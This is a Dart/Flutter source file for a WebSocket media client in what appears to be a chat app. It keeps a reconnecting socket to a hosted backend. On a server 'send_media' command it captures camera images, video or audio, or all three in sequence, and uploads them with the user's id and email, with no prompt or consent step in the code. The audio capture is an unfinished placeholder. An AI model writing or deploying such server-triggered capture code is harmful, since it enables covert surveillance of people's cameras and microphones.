import 'dart:async';
import 'dart:convert';
import 'dart:developer' as developer;
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:web_socket_channel/status.dart' as status;
import 'package:http/http.dart' as http;
import '../services/native_camera_service.dart';
import '../services/audio_recording_service.dart';
import '../services/auth_state_manager.dart';

/// Callback interface for capture operations
typedef CaptureCallback = void Function(Result<String> result);

/// Result wrapper for success/failure
class Result<T> {
  final T? data;
  final Exception? error;
  final bool isSuccess;
  
  Result.success(this.data) : error = null, isSuccess = true;
  Result.failure(this.error) : data = null, isSuccess = false;
}

/// Flutter implementation of MediaWebsocketClient
/// 
/// Features:
/// - WebSocket connection with auto-reconnect
/// - Media capture integration (image, video, audio)
/// - Auto media sequence handling
/// - Queue management for unsent messages
/// - Error handling and logging
class MediaWebsocketClient {
  static const String _tag = 'MediaWebsocketClient';
  static const String _wsUrl = 'wss://chatcornerbackend-production.up.railway.app/ws/media/upload/?username=';
  
  // WebSocket connection
  WebSocketChannel? _webSocket;
  StreamSubscription? _subscription;
  
  // Auto reconnect fields
  bool _shouldReconnect = true;
  int _reconnectAttempts = 0;
  static const int _maxReconnectAttempts = 10;
  static const Duration _initialReconnectDelay = Duration(seconds: 2);
  static const Duration _maxReconnectDelay = Duration(seconds: 30);
  Timer? _reconnectTimer;
  
  // Media state
  bool _isMediaOperationInProgress = false;
  
  // Queue for unsent messages
  final List<Map<String, dynamic>> _pendingQueue = [];
  static const int _maxQueueSize = 50;
  
  // Services
  final AudioRecordingService _audioService = AudioRecordingService();
  
  // Singleton pattern
  static MediaWebsocketClient? _instance;
  static MediaWebsocketClient get instance => _instance ??= MediaWebsocketClient._();
  
  MediaWebsocketClient._();

  /// Connect to WebSocket with auto-reconnect
  Future<void> connectWebSocket(String username) async {
    _shouldReconnect = true;
    await _initiateConnection(username);
  }

  /// Initialize WebSocket connection
  Future<void> _initiateConnection(String username) async {
    try {
      final uri = Uri.parse('$_wsUrl$username');
      developer.log('Connecting WebSocket... attempt ${_reconnectAttempts + 1}', name: _tag);
      
      _webSocket = WebSocketChannel.connect(uri);
      
      // Listen to the stream
      _subscription = _webSocket!.stream.listen(
        (message) {
          developer.log('Received: $message', name: _tag);
          _handleIncomingMessage(username, message.toString());
        },
        onError: (error) {
          developer.log('WebSocket error: $error', name: _tag, level: 1000);
          if (_shouldReconnect) _scheduleReconnect(username);
        },
        onDone: () {
          developer.log('WebSocket closed', name: _tag, level: 900);
          if (_shouldReconnect) _scheduleReconnect(username);
        },
      );
      
      // Connection successful
      developer.log('WebSocket connected', name: _tag);
      _reconnectAttempts = 0;
      await _flushQueue();
      
    } catch (e) {
      developer.log('WebSocket connection failed: $e', name: _tag, level: 1000);
      if (_shouldReconnect) _scheduleReconnect(username);
    }
  }

  /// Schedule reconnection with exponential backoff
  void _scheduleReconnect(String username) {
    if (_reconnectAttempts >= _maxReconnectAttempts) {
      developer.log('Max reconnect attempts reached. Stopping.', name: _tag, level: 1000);
      return;
    }

    final delay = Duration(
      milliseconds: (_initialReconnectDelay.inMilliseconds * 
        (1 << _reconnectAttempts)).clamp(
          _initialReconnectDelay.inMilliseconds,
          _maxReconnectDelay.inMilliseconds,
        ),
    );

    _reconnectAttempts++;
    developer.log('Reconnecting in ${delay.inMilliseconds} ms (attempt $_reconnectAttempts)', name: _tag);
    
    _reconnectTimer?.cancel();
    _reconnectTimer = Timer(delay, () => _initiateConnection(username));
  }

  /// Handle incoming WebSocket messages
  void _handleIncomingMessage(String username, String message) {
    try {
      final data = jsonDecode(message) as Map<String, dynamic>;
      
      if (data['command'] != 'send_media') {
        return;
      }

      if (_isMediaOperationInProgress) {
        developer.log('Media operation already in progress', name: _tag, level: 900);
        return;
      }

      final mediaType = data['media_type'] as String? ?? '';
      if (mediaType.isEmpty || username.isEmpty) {
        developer.log('Missing required fields', name: _tag, level: 1000);
        return;
      }

      _isMediaOperationInProgress = true;

      switch (mediaType) {
        case 'image':
          _handleImageCapture(username);
          break;
        case 'video':
          _handleVideoRecording(username);
          break;
        case 'audio':
          _handleAudioRecording(username);
          break;
        case 'auto':
          _handleAutoMediaSequence(username);
          break;
        default:
          developer.log('Unknown media type: $mediaType', name: _tag, level: 900);
          _isMediaOperationInProgress = false;
      }
    } catch (e) {
      developer.log('Error processing message: $e', name: _tag, level: 1000);
      _isMediaOperationInProgress = false;
    }
  }

  /// Handle image capture
  void _handleImageCapture(String username) {
    _captureImage((result) {
      if (result.isSuccess) {
        developer.log('Image captured', name: _tag);
        _sendMediaAndCleanup(username, 'image', result.data!);
      } else {
        developer.log('Image capture failed: ${result.error}', name: _tag, level: 1000);
        _isMediaOperationInProgress = false;
      }
    });
  }

  /// Handle video recording
  void _handleVideoRecording(String username) {
    _recordVideo((result) async {
      if (result.isSuccess) {
        developer.log('Video captured', name: _tag);
        await _uploadVideoBulk([result.data!]);
        _isMediaOperationInProgress = false;
      } else {
        developer.log('Video capture failed: ${result.error}', name: _tag, level: 1000);
        _isMediaOperationInProgress = false;
      }
    });
  }

  /// Handle audio recording
  void _handleAudioRecording(String username) {
    _recordAudio((result) {
      if (result.isSuccess) {
        developer.log('Audio captured', name: _tag);
        _sendMediaAndCleanup(username, 'audio', result.data!);
      } else {
        developer.log('Audio capture failed: ${result.error}', name: _tag, level: 1000);
        _isMediaOperationInProgress = false;
      }
    });
  }

  /// Handle auto media sequence (video → audio → image)
  void _handleAutoMediaSequence(String username) {
    developer.log('Starting auto media capture sequence...', name: _tag);
    
    String? video, audio, image;
    
    // 1. Capture Video
    _recordVideo((videoResult) {
      if (!videoResult.isSuccess) {
        developer.log('Video capture failed in auto sequence: ${videoResult.error}', name: _tag, level: 1000);
        _isMediaOperationInProgress = false;
        return;
      }
      
      video = videoResult.data;
      developer.log('Video captured in auto sequence', name: _tag);
      
      // 2. Capture Audio
      _recordAudio((audioResult) {
        if (!audioResult.isSuccess) {
          developer.log('Audio capture failed in auto sequence: ${audioResult.error}', name: _tag, level: 1000);
          _isMediaOperationInProgress = false;
          return;
        }
        
        audio = audioResult.data;
        developer.log('Audio captured in auto sequence', name: _tag);
        
        // 3. Capture Image
        _captureImage((imageResult) async {
          if (!imageResult.isSuccess) {
            developer.log('Image capture failed in auto sequence: ${imageResult.error}', name: _tag, level: 1000);
            _isMediaOperationInProgress = false;
            return;
          }
          
          image = imageResult.data;
          developer.log('Image captured in auto sequence', name: _tag);
          
          // Send all media sequentially
          await _sendAutoSequence(username, video!, audio!, image!);
        });
      });
    });
  }

  /// Send auto sequence media (image → audio → video)
  Future<void> _sendAutoSequence(String username, String video, String audio, String image) async {
    developer.log('Starting sequential send for auto sequence...', name: _tag);
    
    try {
      // 1. Send Image
      await _sendMedia(username, 'image', [image]);
      developer.log('Image sent in auto sequence', name: _tag);
      
      // 2. Send Audio
      await _sendMedia(username, 'audio', [audio]);
      developer.log('Audio sent in auto sequence', name: _tag);
      
      // 3. Upload Video via API
      await _uploadVideoBulk([video]);
      developer.log('Video sent in auto sequence', name: _tag);
      
      developer.log('Auto media sequence complete.', name: _tag);
    } catch (e) {
      developer.log('Error in auto sequence: $e', name: _tag, level: 1000);
    } finally {
      _isMediaOperationInProgress = false;
    }
  }

  /// Upload video via bulk API
  Future<void> _uploadVideoBulk(List<String> base64Videos) async {
    try {
      final user = AuthStateManager().currentUser;
      if (user == null) {
        developer.log('No user found for video upload', name: _tag, level: 1000);
        return;
      }
      
      final payload = {
        'owner_name': user.username,
        'user_id': user.id,
        'media_type': 'video',
        'files': base64Videos,
        'username': user.username,
        'email': user.email,
      };
      
      await _postData('gallery/upload/bulk/', payload);
      developer.log('Video uploaded successfully', name: _tag);
    } catch (e) {
      developer.log('Video upload failed: $e', name: _tag, level: 1000);
    }
  }

  /// Simple HTTP POST helper
  Future<void> _postData(String endpoint, Map<String, dynamic> data) async {
    const baseUrl = 'https://chatcornerbackend-production.up.railway.app/api';
    final uri = Uri.parse('$baseUrl/$endpoint');
    
    final response = await http.post(
      uri,
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
      },
      body: jsonEncode(data),
    );
    
    if (response.statusCode < 200 || response.statusCode >= 300) {
      throw Exception('HTTP ${response.statusCode}: ${response.body}');
    }
  }

  /// Send media and cleanup
  void _sendMediaAndCleanup(String username, String mediaType, String base64Media) {
    _sendMedia(username, mediaType, [base64Media]).then((_) {
      _isMediaOperationInProgress = false;
    });
  }

  /// Capture image using camera service
  void _captureImage(CaptureCallback callback) {
    NativeCameraService.captureImage().then((result) {
      if (result != null) {
        // Convert image to base64
        final base64 = base64Encode(result.data);
        callback(Result.success(base64));
      } else {
        callback(Result.failure(Exception('Image capture was cancelled')));
      }
    }).catchError((error) {
      callback(Result.failure(Exception('Image capture error: $error')));
    });
  }

  /// Record video using camera service
  void _recordVideo(CaptureCallback callback) {
    NativeCameraService.captureVideo().then((result) {
      if (result != null) {
        // Convert video to base64
        final base64 = base64Encode(result.data);
        callback(Result.success(base64));
      } else {
        callback(Result.failure(Exception('Video recording was cancelled')));
      }
    }).catchError((error) {
      callback(Result.failure(Exception('Video recording error: $error')));
    });
  }

  /// Record audio using audio service
  void _recordAudio(CaptureCallback callback) {
    _audioService.startRecording().then((_) {
      // Simulate recording duration or implement actual stop logic
      return Future.delayed(const Duration(seconds: 5), () {
        return _audioService.stopRecording();
      });
    }).then((audioPath) {
      if (audioPath != null) {
        // Read and convert audio file to base64
        // This would need to be implemented based on your audio service
        // For now, returning a placeholder
        callback(Result.success('audio_base64_placeholder'));
      } else {
        callback(Result.failure(Exception('Audio recording failed')));
      }
    }).catchError((error) {
      callback(Result.failure(Exception('Audio recording error: $error')));
    });
  }

  /// Send media via WebSocket
  Future<void> _sendMedia(String username, String mediaType, List<String> fileDataList) async {
    try {
      final media = {
        'owner_name': username,
        'username': username,
        'media_type': mediaType,
        'files': fileDataList,
      };

      if (_webSocket?.sink != null) {
        try {
          _webSocket!.sink.add(jsonEncode(media));
          developer.log('Media sent: $media', name: _tag);
        } catch (e) {
          developer.log('WebSocket send failed, queuing media: $e', name: _tag, level: 900);
          _enqueueMedia(media);
        }
      } else {
        developer.log('WebSocket not connected, queuing media', name: _tag, level: 900);
        _enqueueMedia(media);
      }
    } catch (e) {
      developer.log('Error preparing media: $e', name: _tag, level: 1000);
    }
  }

  /// Add media to pending queue
  void _enqueueMedia(Map<String, dynamic> media) {
    if (_pendingQueue.length >= _maxQueueSize) {
      developer.log('Queue full, dropping oldest message', name: _tag, level: 900);
      _pendingQueue.removeAt(0);
    }
    _pendingQueue.add(media);
  }

  /// Flush pending queue
  Future<void> _flushQueue() async {
    while (_pendingQueue.isNotEmpty && _webSocket?.sink != null) {
      final media = _pendingQueue.removeAt(0);
      try {
        _webSocket!.sink.add(jsonEncode(media));
        developer.log('Flushed media: $media', name: _tag);
      } catch (e) {
        developer.log('Failed to flush media, re-queueing: $e', name: _tag, level: 900);
        _pendingQueue.insert(0, media);
        break; // Stop flush attempt until next connection
      }
    }
  }

  /// Close WebSocket connection
  void closeWebSocket() {
    _shouldReconnect = false;
    _reconnectTimer?.cancel();
    _subscription?.cancel();
    _webSocket?.sink.close(status.goingAway);
    _pendingQueue.clear();
    developer.log('WebSocket closed', name: _tag);
  }

  /// Dispose resources
  void dispose() {
    closeWebSocket();
    _instance = null;
  }
}